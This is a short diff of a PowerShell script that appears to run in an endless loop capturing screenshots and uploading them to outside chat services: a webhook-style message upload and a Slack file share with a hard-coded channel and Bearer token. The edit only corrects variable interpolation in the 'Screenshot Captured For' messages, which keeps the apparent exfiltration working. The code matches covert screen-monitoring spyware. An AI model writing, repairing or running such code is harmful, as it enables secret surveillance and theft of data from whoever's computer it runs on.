@@ -35,7 +35,7 @@ while(1){
       $lf = "`r`n"
       $pt1 = @{
           "username" = $uu
-          "content"  = "`**Screenshot Captured For %cc At %tml`**"
+          "content"  = "`**Screenshot Captured For $cc At $tml`**"
       } | ConvertTo-Json -Compress
       $q1t = (
           "--$bd",
@@ -70,7 +70,7 @@ while(1){
           $scb = @{
               "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
               "channel_id" = "C08F8RJ84P5"
-              "initial_comment"  = "`*Screenshot Captured For %cc At %tml`*"
+              "initial_comment"  = "`*Screenshot Captured For $cc At $tml`*"
           } | ConvertTo-Json -Compress
           $sh = @{
               "Authorization" = "Bearer $sat"
